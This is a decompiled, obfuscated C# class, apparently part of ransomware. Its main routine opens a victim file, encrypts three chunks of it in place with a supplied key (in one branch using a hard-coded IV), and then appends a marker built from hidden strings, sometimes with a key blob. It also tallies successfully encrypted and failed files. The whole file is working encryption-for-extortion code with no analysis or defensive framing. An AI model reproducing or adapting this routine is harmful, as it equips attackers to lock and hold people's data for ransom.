using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using leLftCXICzmTes;

namespace uBrdXrCSgnwM;

internal sealed class XacBjLZheqmg
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int BxDNKTqwuQshxWF(long long_0)
	{
		return (int)long_0;
	}

	public static bool buINgJekbREt(string IjcbTsiBezin, string pgHAWUTDKybqqVl, string foRTtZluxvFoX, byte[] dhUTYIaOTPhrtoZl = null, byte[] QQWRBqbezdUl = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(IjcbTsiBezin, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = BxDNKTqwuQshxWF(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(pgHAWUTDKybqqVl) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(pgHAWUTDKybqqVl) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(pgHAWUTDKybqqVl) * 1024 * 1024) / 10;
				}
				int iEgTowQfFMK = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = SdijrREvBlip(IjcbTsiBezin, fileStream, iEgTowQfFMK, num * i);
					array = (fQUgTOUpJumL.OIyyeuNoRzhHTwe ? yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(foRTtZluxvFoX), QQWRBqbezdUl) : jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(foRTtZluxvFoX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					ZNCDmlUiOoie(IjcbTsiBezin, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = ((!fQUgTOUpJumL.MFCrMNyVwftIF) ? (fQUgTOUpJumL.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107407728)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408637)) + Convert.ToString(pgHAWUTDKybqqVl) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408637))) : Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107407709)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408637)) + Convert.ToString(pgHAWUTDKybqqVl) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408637)))) : (fQUgTOUpJumL.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107407715)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408647)) + Convert.ToString(pgHAWUTDKybqqVl) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408647))) : Encoding.ASCII.GetBytes(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107407709)) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408647)) + Convert.ToString(pgHAWUTDKybqqVl) + fQUgTOUpJumL.khBNqVxVYaM(getString_0(107408647)))));
			if (!fQUgTOUpJumL.MFCrMNyVwftIF)
			{
				using FileStream fileStream2 = new FileStream(IjcbTsiBezin, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(IjcbTsiBezin, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(dhUTYIaOTPhrtoZl, 0, dhUTYIaOTPhrtoZl.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (fQUgTOUpJumL.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(fQUgTOUpJumL.LImNkSPhwOOQHW, getString_0(107386913) + IjcbTsiBezin + getString_0(107407670) + ex.Message + getString_0(107395928));
				}
				catch (Exception)
				{
				}
			}
			fQUgTOUpJumL.gmdqiJfLiKSG++;
			return false;
		}
		fQUgTOUpJumL.DnHtYVwZFeaR++;
		return true;
	}

	public static byte[] SdijrREvBlip(string pxwsQiJqAOqcU, FileStream aiFchcXXjuzdPD, int IEgTowQfFMK, int mTmEvIpgkOX = 0)
	{
		byte[] array = new byte[IEgTowQfFMK];
		aiFchcXXjuzdPD.Position = mTmEvIpgkOX;
		aiFchcXXjuzdPD.Read(array, 0, IEgTowQfFMK);
		return array;
	}

	public static void ZNCDmlUiOoie(string nOomxsRndyHB, FileStream qSTTAUpUOBT, byte[] ACBIaIzXSUaU, int miMYYUgOYTotb = 0)
	{
		qSTTAUpUOBT.Position = miMYYUgOYTotb;
		qSTTAUpUOBT.Write(ACBIaIzXSUaU, 0, ACBIaIzXSUaU.Length);
	}

	static XacBjLZheqmg()
	{
		Strings.CreateGetStringDelegate(typeof(XacBjLZheqmg));
	}
}
